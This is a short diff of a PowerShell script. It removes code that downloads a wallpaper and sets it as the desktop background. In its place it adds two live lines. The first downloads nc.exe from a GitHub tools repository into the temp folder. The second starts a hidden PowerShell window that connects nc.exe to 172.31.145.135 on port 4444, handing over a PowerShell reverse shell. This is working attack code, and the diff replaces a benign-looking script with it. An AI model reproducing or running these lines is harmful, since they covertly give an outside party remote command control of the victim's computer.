@@ -1,22 +1,2 @@
-$MyWallpaper="$env:tmp\wall.jpg"
-Invoke-WebRequest -Uri https://newevolutiondesigns.com/images/freebies/cool-4k-wallpaper-1.jpg -UseBasicParsing -outfile $MyWallpaper
-$code = @' 
-using System.Runtime.InteropServices; 
-namespace Win32{ 
-    
-     public class Wallpaper{ 
-        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
-         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
-         
-         public static void SetWallpaper(string thePath){ 
-            SystemParametersInfo(20,0,thePath,3); 
-         }
-    }
- } 
-'@
-
-add-type $code 
-[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-
-# Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/pastebin/nc.exe?raw=true' -UseBasicParsing -OutFile $env:tmp\nc.exe
-# start-process powershell -argumentlist "$env:tmp\nc.exe 172.31.149.33 4444 -e powershell" -windowstyle hidden
+Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/pastebin/nc.exe?raw=true' -UseBasicParsing -OutFile $env:tmp\nc.exe
+start-process powershell -argumentlist "$env:tmp\nc.exe 172.31.145.135 4444 -e powershell" -windowstyle hidden
